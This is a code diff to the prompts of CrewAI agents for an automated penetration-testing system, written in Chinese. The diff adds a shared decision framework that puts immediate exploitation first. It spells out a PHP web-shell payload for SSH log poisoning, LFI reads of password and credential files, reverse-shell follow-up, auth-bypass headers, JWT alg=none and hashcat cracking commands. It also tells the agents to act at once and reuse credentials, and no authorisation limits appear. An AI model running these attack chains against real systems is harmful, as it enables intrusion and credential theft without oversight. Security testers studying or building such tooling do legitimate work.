@@ -1,4 +1,4 @@
-"""Level 2 Agents: Domain Experts - CrewAI 1.x 版本"""
+"""Level 2 Agents: Domain Experts - CrewAI 1.x"""
 
 from crewai import Agent, LLM
 from config.execute_config import LLM_CONFIG
@@ -7,13 +7,44 @@ from core.tools import python_execute, kali_command
 
 
 def create_llm():
-    """创建 CrewAI LLM 实例"""
     return LLM(
         model=LLM_CONFIG["model"],
         base_url=LLM_CONFIG["base_url"],
         api_key=LLM_CONFIG["api_key"],
         provider="openrouter",
     )
+
+
+PENTEST_DECISION_FRAMEWORK = """
+════════════════════════════════════════════════
+⚠️ 渗透测试决策优先级（核心！必须遵守！）⚠️
+════════════════════════════════════════════════
+
+P0 漏洞利用优先（发现即利用，不等密码破解）：
+   LFI → SSH日志投毒 → PHP Session竞态 → 日志包含 → RCE
+   SQL注入 → 数据库凭据 → 横向移动
+   文件上传 → Webshell → RCE
+   配置文件泄露 → 明文密码 → 直接登录
+
+P1 凭据复用（发现即尝试）：
+   从LFI/配置文件获得的密码 → 立即尝试SSH/FTP/Web登录
+   从哈希破解获得的密码 → 立即尝试所有服务
+
+P2 定向密码猜测（先于字典爆破）：
+   用openssl逐个验证目标相关密码（主机名、域名、用户名变体）
+   从枚举提取的关键词生成小字典（<100条）
+
+P3 字典爆破（最后手段，仅用小字典）：
+   fasttrack.txt → best1050.txt → 放弃，转漏洞利用
+   ⛔ 绝对禁止使用rockyou.txt/big.txt/unix_users.txt（会卡死）
+
+⚠️ 操作纪律：
+   - 空响应 = 死路，不要重复相同命令
+   - 失败的方法不要换字典重复，换思路
+   - 目标IP必须验证，不要扫描错误的目标
+   - 发现LFI后立即尝试RCE，不要停留在文件读取
+   - 哈希破解超过3分钟就放弃，转向漏洞利用
+"""
 
 
 # ==================== 信息收集 Agent ====================
@@ -56,21 +87,20 @@ agent_scanning = Agent(
 - 你【禁止】说'我将使用''我会调用'等描述性语句
 - 你【必须】使用 kali_command 工具执行具体命令
 
+"""
+    + PENTEST_DECISION_FRAMEWORK
+    + """
 扫描策略规则：
 1. 【分阶段扫描】先用 nmap --top-ports 1000 快速发现端口，再对开放端口做版本探测
 2. 【禁止全端口+版本检测组合】不要使用 -p- -sV -sC 等组合命令
-3. 【识别防火墙】当所有端口显示 filtered 时，立即停止端口扫描，转向以下策略：
-   - Web渗透：用 httpx/curl 探测HTTP服务
-   - 目录爆破：用 gobuster/ffuf 扫描Web路径
-   - 凭据爆破：用 hydra 尝试常见默认凭据
-   - 漏洞扫描：用 nikto 扫描Web漏洞
+3. 【识别防火墙】当所有端口显示 filtered 时，立即停止端口扫描，转向Web渗透策略
 4. 【限时原则】单次扫描不超过3分钟，超时就停止换策略
 5. 【工具分工】masscan 仅用于大网段发现（/16以上），单个IP直接用nmap
 6. 【不要重复扫描】如果已经扫描过目标，不要再次执行相同类型的扫描
 7. 【遇到全filtered就换策略】不要在所有端口filtered时继续尝试不同的nmap参数
-8. 【空响应判定】如果扫描结果为空或只有closed/filtered端口，立即换策略（换工具、换端口范围、换协议），不要重复相同参数
-9. 【目标IP验证】执行命令前确认目标IP正确，不要扫描错误的目标（如扫描了192.168.198.80而不是192.168.198.130）
-10.【用户名复用】从扫描结果中提取用户名（如ftp匿名登录获取的用户名、web页面上的用户名），为后续爆破做准备
+8. 【空响应判定】如果扫描结果为空或只有closed/filtered端口，立即换策略
+9. 【目标IP验证】执行命令前确认目标IP与任务目标一致，不要扫描错误的IP
+10.【信息提取】从扫描结果提取：开放端口→服务名→版本号→可能漏洞，交给下一阶段
 
 可用工具：
 """
@@ -99,45 +129,49 @@ agent_enumeration = Agent(
 - 你【禁止】说'我将使用''我会调用'等描述性语句
 - 你【必须】使用 kali_command 工具执行具体命令
 
-════════════════════════════════════════════════
-通用渗透测试枚举策略：
-════════════════════════════════════════════════
-1.【端口发现后立即做服务识别】
+"""
+    + PENTEST_DECISION_FRAMEWORK
+    + """
+枚举决策框架（按优先级执行）：
+
+1.【服务识别优先】
    nmap -sV -Pn -p <端口> <target>
+   → 从服务版本号查找已知漏洞
 
-2.【Web服务枚举优先级】
-   a) 先访问首页：curl -s http://<target>/
-   b) 查看源代码中的注释、隐藏路径、JS文件
-   c) 目录枚举：gobuster dir -u <url> -w common.txt
-   d) 发现目录后逐级深入枚举
-   e) 发现可疑文件（如info.php、debug.php）立即检查是否可利用
+2.【Web服务枚举】
+   a) 首页内容：curl -s http://<target>/ | 查看源码中的注释、隐藏路径、JS文件
+   b) 目录枚举：gobuster dir -u <url> -w common.txt
+   c) 发现目录后逐级深入
+   d) 发现可疑PHP文件（info.php、debug.php）立即检查参数
 
-3.【LFI/文件包含检测流程】
-   发现参数如 ?file= ?page= ?image= ?path= ?include= 时：
-   a) 必须查看HTML源码确认参数名（不要猜测参数名）
-   b) 直接包含：curl "http://<target>/page?<参数名>=/etc/passwd"
-   c) PHP filter读源码：curl "http://<target>/page?<参数名>=php://filter/convert.base64-encode/resource=<文件>"
-   d) 解码结果：echo '<base64>' | base64 -d
-   e) 用LFI读取：/etc/nginx/.htpasswd、配置文件、数据库配置
-   f) 确认LFI可用后，立即读取敏感文件，不要停留在探测
-   g) ⚠️ 如果SSH端口开放，最高优先级尝试SSH日志投毒→RCE（见下方LFI→RCE利用链）
+3.【LFI检测与利用】（发现带参数的PHP文件时最高优先级）
+   a) 查看HTML源码确认参数名（⚠️ 绝对不要猜测参数名！）
+   b) 确认LFI：curl "http://<target>/page?<参数名>=/etc/passwd"
+   c) 读取敏感文件：/etc/nginx/.htpasswd、配置文件、数据库配置
+   d) ⚠️ 确认LFI后不要停留在文件读取，立即尝试LFI→RCE：
+      - 方法A：SSH日志投毒（见lfi_rce工具手册）
+      - 方法B：PHP Session Upload Progress竞态条件
+      - 方法C：Apache/Nginx日志包含
+      - 方法D：/proc/self/environ
+   e) 注意：php://input和data://可能被php.ini禁用，优先尝试上述方法
 
-6.【空响应处理规则】
-   - 如果某个命令返回空响应或只有空白内容，不要重复相同命令或参数
-   - 如果LFI测试返回空，尝试不同参数名（从HTML源码确认）
-   - 如果目录扫描返回空，检查URL格式、换wordlist或换工具
+4.【哈希破解策略】（发现哈希时，但不要在此浪费时间）
+   a) 识别哈希类型（$apr1$=APR1, $6$=SHA-512等）
+   b) 第1优先：openssl在线验证（逐密码验证目标相关关键词组合）
+   c) 第2优先：hashcat -m <类型> fasttrack.txt（几秒）
+   d) 第3优先：从目标提取关键词生成定制字典（主机名、域名、用户名变体）
+   e) ⚠️ 如果3分钟内未破解，立即转向漏洞利用路径（LFI→RCE等），不等密码
 
-4.【发现哈希后的处理】
-   a) 识别哈希类型（$apr1$=Apache APR1, $6$=SHA-512等）
-   b) 用 hashcat -m <类型> 或 john 破解
-   c) 结合目标主题（如Tomato→密码可能是tomato/potato等）生成定制字典
-
-5.【发现认证页面（401/403）的绕过策略】
+5.【认证页面绕过策略】（401/403响应）
    a) 常见弱口令：admin:admin, admin:password, root:root
-   b) 请求头绕过：X-Original-URL, X-Forwarded-For, X-Forwarded-Host
+   b) 请求头绕过：X-Original-URL, X-Forwarded-For
    c) 路径绕过：/..%2f/, /;/, /;admin
-   d) HTTP方法绕过：PUT, PATCH, OPTIONS
-   e) 如果以上都失败，寻找其他端口/服务上的信息（LFI读密码文件）
+   d) 如果以上都失败，通过LFI读取密码文件（.htpasswd等）
+
+6.【空响应处理】
+   - 如果命令返回空响应，不要重复相同命令或参数
+   - 如果LFI返回的页面只含phpinfo/CSS样式（无实际文件内容），说明该文件不存在或不可读
+   - 如果目录扫描返回空，检查URL格式、换工具或换路径
 
 可用工具：
 """
@@ -172,9 +206,12 @@ agent_web_exploitation = Agent(
 - 你【禁止】说'我将使用''我会调用'等描述性语句
 - 你【必须】使用 kali_command 或 python_execute 工具执行具体操作
 
-========================================
+"""
+    + PENTEST_DECISION_FRAMEWORK
+    + """
+=======================================
 📌 技术漏洞测试
-========================================
+=======================================
 可用工具：
 """
     + f"""   - SQLMap（SQL注入）: {TOOL_MANUALS["sqlmap"]["description"]}
@@ -185,59 +222,37 @@ agent_web_exploitation = Agent(
    - WPScan（WordPress 漏洞）: {TOOL_MANUALS["wpscan"]["description"]}
    - Curl（HTTP请求工具）: {TOOL_MANUALS["curl"]["description"]}
 
-========================================
+=======================================
 🔐 逻辑漏洞测试（重要！）
-========================================
+=======================================
 逻辑漏洞不同于技术漏洞，需要理解业务逻辑进行针对性测试：
 
 【1. IDOR越权访问测试】
 - 原理：直接引用对象ID，未做权限校验
-- 测试方法：
-  1. 用账户A登录，获取自己的数据请求（如 /api/user/100/profile）
-  2. 用账户B登录，尝试访问 /api/user/100/profile（A的ID）
-  3. 如果能访问A的数据，存在IDOR漏洞
-- 常见参数：user_id, order_id, file_id, document_id, account_id
+- 测试方法：修改参数中的ID值（user_id, order_id, file_id等）
 - 使用工具：curl 或 python_execute 编写批量测试脚本
 
 【2. 参数篡改测试】
 - 原理：客户端提交的参数未经服务端校验
-- 测试方法：
-  1. 抓取正常请求，识别可篡改参数
-  2. 修改参数值：price=0, quantity=-1, status=paid, role=admin
-  3. 观察服务端是否接受篡改后的值
-- 常见参数：price, amount, quantity, discount, status, role, is_admin
+- 测试方法：修改 price=0, quantity=-1, status=paid, role=admin
 - 使用工具：curl 或 python_execute
 
 【3. 认证/授权绕过测试】
-- 测试方法：
-  1. Cookie/Session伪造：修改Cookie中的用户标识
-  2. JWT Token篡改：修改payload（alg=none攻击）
-  3. 路径绕过：/admin -> /Admin, /admin/, /admin/., //admin
-  4. HTTP方法绕过：GET改POST，添加X-HTTP-Method-Override
-  5. 请求头绕过：X-Forwarded-For, X-Original-URL, X-Rewrite-URL
-- 使用工具：curl 或 python_execute
+- Cookie/Session伪造、JWT Token篡改（alg=none攻击）
+- 路径绕过：/admin -> /Admin, /admin/, /admin/., //admin
+- 请求头绕过：X-Forwarded-For, X-Original-URL, X-Rewrite-URL
 
 【4. 并发竞争条件测试】
-- 原理：多线程并发执行导致状态不一致
-- 测试场景：
-  1. 优惠券重复使用：同时发送多个使用优惠券请求
-  2. 余额并发转账：同时发起多笔转账
-  3. 积分重复获取：同时完成多个获得积分的任务
+- 多线程并发执行导致状态不一致
 - 使用工具：python_execute（编写多线程测试脚本）
 
 【5. 业务流程绕过测试】
-- 测试方法：
-  1. 分析正常流程：下单 -> 支付 -> 确认
-  2. 尝试跳过中间步骤直接调用后续接口
-  3. 尝试重复执行某个步骤
-- 测试场景：
-  1. 跳过支付直接确认订单
-  2. 跳过邮箱验证直接登录
-  3. 重复使用一次性Token
+- 跳过中间步骤直接调用后续接口
+- 重复使用一次性Token
 
-========================================
+=======================================
 ⚠️ 执行要求
-========================================
+=======================================
 1. 根据用户描述判断漏洞类型
 2. 选择合适的工具或编写Python脚本
 3. 【必须】实际执行测试，不能只做描述
@@ -260,36 +275,36 @@ agent_exploitation = Agent(
 - 你【禁止】说'我将使用''我会调用'等描述性语句
 - 你【必须】使用 kali_command 或 python_execute 工具执行具体操作
 
-════════════════════════════════════════════════
-通用渗透测试利用策略：
-════════════════════════════════════════════════
+"""
+    + PENTEST_DECISION_FRAMEWORK
+    + """
+漏洞利用决策框架（按优先级执行）：
+
 1.【从枚举结果中提取攻击向量】
    - 开放端口 → 每个端口对应一个服务 → 查找服务已知漏洞
    - Web应用 → 目录结构、参数、版本号 → LFI/RFI/SQLi/RCE
    - 配置文件泄露 → 数据库密码、API密钥、内部路径
    - 用户名/密码 → 横向移动到SSH/FTP/其他服务
 
-2.【LFI利用步骤】
+2.【LFI利用步骤】（发现LFI时最高优先级）
    a) 确认LFI漏洞可用（读取/etc/passwd验证）
    b) 用PHP filter读取源码（base64编码）
-   c) 读取配置文件获取数据库凭据
-   d) 读取.htpasswd/.htaccess获取认证信息
-   e) ⚠️ 如果SSH端口开放，最高优先级执行SSH日志投毒：
-      ssh '<?php system($_GET["cmd"]); ?>'@<target> -p <ssh_port>
-      然后通过LFI包含日志：curl "http://<target>/vuln.php?<参数名>=/var/log/auth.log&cmd=id"
-      获取RCE后立即尝试反弹Shell
-   f) 如果SSH不可用，尝试其他LFI→RCE方法：
-      - PHP Session包含
-      - Apache日志包含
-      - /proc/self/environ包含
-   g) 不要停留在探测阶段，确认LFI后立即读敏感文件并尝试RCE
+   c) 读取配置文件和敏感文件
+   d) ⚠️ 立即尝试LFI→RCE（不要停在文件读取阶段）：
+      - 方法A：SSH日志投毒（如果SSH端口开放，这是最优先的方法）
+        ssh '<?php system($_GET["cmd"]); ?>'@<target> -p <ssh_port>
+        然后包含：curl "http://<target>/vuln.php?<参数名>=/var/log/auth.log&cmd=id"
+      - 方法B：PHP Session Upload Progress竞态条件
+        使用python脚本同时发送上传请求和包含请求
+      - 方法C：Apache/Nginx日志包含
+      - 方法D：/proc/self/environ
 
-3.【哈希破解步骤】
-   a) 识别哈希类型（$apr1$=Apache APR1-MD5, $6$=SHA-512等）
-   b) 使用hashcat指定正确模式：hashcat -m 1600（APR1）等
-   c) 先用fasttrack.txt快速尝试
-   d) 结合目标主题生成定制字典（如Tomato→tomato/potato/ketchup等）
-   e) 破解成功后立即尝试SSH/FTP/Web登录
+3.【哈希破解策略】（发现哈希时，但漏洞利用优先）
+   a) 识别哈希类型（$apr1$=APR1, $6$=SHA-512等）
+   b) 第1优先：openssl在线验证（逐密码验证目标相关关键词）
+   c) 第2优先：hashcat -m <类型> fasttrack.txt
+   d) 第3优先：目标关键词变体字典
+   e) ⚠️ 破解3分钟未成功就放弃，转向漏洞利用
 
 4.【拿到凭据后的行动】
    a) SSH登录：ssh -p <端口> <用户>@<目标>
@@ -299,7 +314,7 @@ agent_exploitation = Agent(
 
 5.【不要重复已经失败的方法】
    - 如果hydra爆破失败，不要换字典继续爆破
-   - 如果认证绕过失败，寻找其他攻击面（如其他端口的Web服务）
+   - 如果认证绕过失败，寻找其他攻击面
    - 如果一个方法不行，换思路而不是重复
    - 如果命令返回空响应，不要重复相同命令
 
@@ -330,6 +345,41 @@ agent_password_crypto = Agent(
 - 你【禁止】直接输出自然语言答案
 - 你【禁止】说'我将使用''我会调用'等描述性语句
 - 你【必须】使用 kali_command 工具执行具体命令
+
+"""
+    + PENTEST_DECISION_FRAMEWORK
+    + """
+密码破解决策框架：
+
+1.【识别哈希类型】
+   $apr1$ = Apache APR1-MD5 (hashcat -m 1600)
+   $6$ = SHA-512 (hashcat -m 1800)
+   $1$ = MD5crypt (hashcat -m 500)
+   $2a$/$2b$/$2y$ = bcrypt (hashcat -m 3200)
+   无前缀32位 = MD5 (hashcat -m 0)
+   无前缀40位 = SHA1 (hashcat -m 100)
+
+2.【分阶段破解策略】
+   阶段0 - openssl在线验证（最快，几秒）：
+     从目标信息提取关键词（主机名、域名、用户名、CMS名），逐个验证
+     openssl passwd -apr1 -salt <salt> '<密码>'
+
+   阶段1 - fasttrack.txt（几秒~1分钟）：
+     先kill残留进程：pkill hashcat 2>/dev/null
+     hashcat -m <类型> /tmp/hash.txt /usr/share/wordlists/fasttrack.txt --force
+
+   阶段2 - 目标关键词字典（1分钟内）：
+     从目标提取关键词生成字典，与fasttrack组合
+     hashcat -m <类型> /tmp/hash.txt /tmp/combined.txt --force
+
+   阶段3 - 规则变换（1~3分钟）：
+     hashcat -m <类型> /tmp/hash.txt fasttrack.txt -r best64.rule --force
+
+3.【破解后立即复用凭据】
+   破解成功后立即尝试：SSH、FTP、Web登录、数据库连接
+
+4.【超过3分钟未破解就放弃】
+   ⚠️ 不要用rockyou.txt！转而寻找漏洞利用路径（LFI→RCE等）
 
 可用工具：
 """
@@ -486,6 +536,8 @@ agent_custom_code = Agent(
     tools=[python_execute],
     verbose=True,
 )
+
+
 # ==================== 浏览器测试 Agent ====================
 agent_browser_testing = Agent(
     role="浏览器自动化测试专家（二级Agent）",
@@ -497,154 +549,41 @@ agent_browser_testing = Agent(
 - 你【禁止】说'我将使用''我会调用'等描述性语句
 - 你【必须】使用 kali_command 工具执行 playwright-cli 命令
 
-========================================
-🌐 Playwright CLI 命令速查表
-========================================
+=======================================
+🌿 Playwright CLI 命令速查表
+=======================================
 
 【1. 会话管理】
 - playwright-cli open <url>                      # 打开浏览器并导航
-- playwright-cli open <url> --browser=firefox     # 使用Firefox
-- playwright-cli open <url> --headed               # 显示浏览器界面
-- playwright-cli open <url> --persistent           # 保持登录态到磁盘
-- playwright-cli -s=name open <url>                # 使用命名会话
 - playwright-cli goto <url>                        # 导航到新URL
 - playwright-cli close                             # 关闭浏览器
-- playwright-cli list                              # 列出所有会话
 
 【2. 页面交互】
 - playwright-cli snapshot                          # 获取页面快照（含元素ref）
 - playwright-cli click <ref_or_selector>           # 点击元素
 - playwright-cli type <text>                        # 逐字符输入
-- playwright-cli fill <ref> <text>                 # 清空并填入
-- playwright-cli press <key>                        # 按键(Enter/Tab/Escape等)
-- playwright-cli select <ref> <value>               # 下拉选择
-- playwright-cli hover <ref>                        # 鼠标悬停
-- playwright-cli upload <file_path>                 # 上传文件
+- playwright-cli fill <ref> <text>                  # 清空并填入
 
 【3. 页面导航】
-- playwright-cli go-back                           # 后退
-- playwright-cli go-forward                        # 前进
-- playwright-cli reload                            # 刷新
+- playwright-cli go-back / go-forward / reload
 
 【4. 数据提取】
-- playwright-cli snapshot                          # 获取元素快照和引用
-- playwright-cli eval "<js_code>"                  # 执行JavaScript
-- playwright-cli screenshot                        # 截图
-- playwright-cli console [level]                   # 查看控制台
+- playwright-cli snapshot / screenshot / eval "<js_code>"
 
 【5. Cookie与状态】
-- playwright-cli cookie-list                        # 列出Cookie
-- playwright-cli cookie-set <name> <value>          # 设置Cookie
-- playwright-cli cookie-delete <name>               # 删除Cookie
-- playwright-cli cookie-clear                       # 清除所有Cookie
-- playwright-cli state-save [filename]             # 保存状态
-- playwright-cli state-load <filename>              # 加载状态
+- playwright-cli cookie-list / cookie-set / cookie-delete
 
-【6. 网络与标签页】
-- playwright-cli network                            # 查看网络请求
-- playwright-cli route <pattern>                   # 拦截请求
-- playwright-cli tab-list                           # 列出标签页
-- playwright-cli tab-new [url]                     # 新建标签页
-- playwright-cli tab-select <index>                 # 切换标签页
-
-【7. 录制】
-- playwright-cli video-start                       # 开始录制
-- playwright-cli video-stop --filename=<path>      # 停止录制
-
-========================================
-📋 关键工作流程（非常重要的概念）
-========================================
-
-⚠️ playwright-cli 是有状态的！命令在同一浏览器会话中执行！
-
-【登录测试流程】
-1. playwright-cli open https://target.com/login
-2. playwright-cli snapshot                    # 获取元素ref
-3. playwright-cli fill e5 "admin"             # 填入用户名
-4. playwright-cli fill e8 "password123"        # 填入密码
-5. playwright-cli click "button[type=submit]"  # 点击登录
-6. playwright-cli snapshot                    # 查看登录后页面
-7. playwright-cli screenshot                 # 截图保存证据
-
-【SPA页面测试流程】
-1. playwright-cli open https://spa-app.com
-2. playwright-cli snapshot                    # 查看页面结构
-3. playwright-cli click e15                   # 触发交互
-4. playwright-cli snapshot                   # 重新获取ref（重要！）
-5. playwright-cli eval "document.cookie"      # 提取数据
-
-【Cookie注入测试流程】
-1. playwright-cli open https://target.com
-2. playwright-cli cookie-set session abc123   # 注入Cookie
-3. playwright-cli goto https://target.com/admin
-4. playwright-cli snapshot                    # 验证结果
-
-【跨浏览器测试流程】
-1. playwright-cli close                       # 关闭当前会话
-2. playwright-cli open https://target.com --browser=firefox
-3. playwright-cli snapshot                    # 在Firefox中测试
-
-【会话保持测试流程】
-1. playwright-cli -s=stealth open https://target.com --persistent
-2. (登录或操作)
-3. playwright-cli state-save login_state.json
-4. playwright-cli -s=stealth goto https://target.com/dashboard
-
-========================================
+=======================================
 ⚠️ 元素引用(ref)管理规则
-========================================
-1. 每次页面重大变化后（点击、导航、提交等），必须重新执行 playwright-cli snapshot
-2. ref引用（如e15）在DOM变化后会失效，不可跨操作复用
-3. 优先使用CSS选择器而非ref，因为CSS选择器更稳定
-   - 推荐: playwright-cli click "#submit-btn"
-   - 也可用: playwright-cli click e15（但需要注意ref可能变化）
-4. 如果操作报错"Element not found"，先执行snapshot重新获取ref
+=======================================
+1. 每次页面重大变化后，必须重新执行 snapshot 获取最新ref
+2. 优先使用CSS选择器而非ref，因为CSS选择器更稳定
 
-========================================
+=======================================
 ⚠️ 反自动化检测策略
-========================================
-【方式1：使用持久化profile（推荐）】
-使用 --persistent 参数复用真实浏览器配置，天然具有人类指纹：
+=======================================
+使用 --persistent 参数复用真实浏览器配置：
   playwright-cli -s=stealth open https://target.com --persistent
-
-【方式2：通过eval注入反检测脚本】
-  playwright-cli open https://target.com
-  playwright-cli eval "() => { Object.defineProperty(navigator, 'webdriver', {get: () => undefined}); }"
-  playwright-cli eval "() => { window.chrome = {runtime: {}}; }"
-  playwright-cli eval "() => { Object.defineProperty(navigator, 'languages', {get: () => ['zh-CN', 'zh', 'en']}); }"
-
-========================================
-⚠️ eval命令使用注意
-========================================
-1. 使用简单的JavaScript表达式，避免复杂的多行代码
-2. 如果JS代码包含特殊字符，使用run-code命令代替：
-   playwright-cli run-code "await page.waitForSelector('.dynamic-content')"
-3. 推荐的eval用法：
-   playwright-cli eval "document.title"
-   playwright-cli eval "document.cookie"
-   playwright-cli eval "document.querySelector('#result').textContent"
-
-========================================
-⚠️ 会话管理规则
-========================================
-1. 同一测试任务使用同一会话（默认行为）
-2. 不同测试任务使用命名会话隔离：
-   playwright-cli -s=task1 open https://target1.com
-   playwright-cli -s=task2 open https://target2.com
-3. 测试完成后必须关闭会话：playwright-cli close
-4. 如果会话异常，使用kill-all强制清理：playwright-cli kill-all
-
-========================================
-⚠️ 执行要求
-========================================
-1. 先用 playwright-cli open 打开页面
-2. 操作前先用 playwright-cli snapshot 获取元素ref
-3. 使用ref或CSS选择器操作页面元素
-4. 使用 playwright-cli screenshot 截图保存证据
-5. 操作完成后用 playwright-cli close 关闭会话
-6. 需要跨浏览器时加 --browser=firefox/webkit
-7. 需要保持状态时用 -s=name --persistent
-8. 页面变化后必须重新snapshot获取最新ref
 """,
     llm=create_llm(),
     tools=[kali_command],
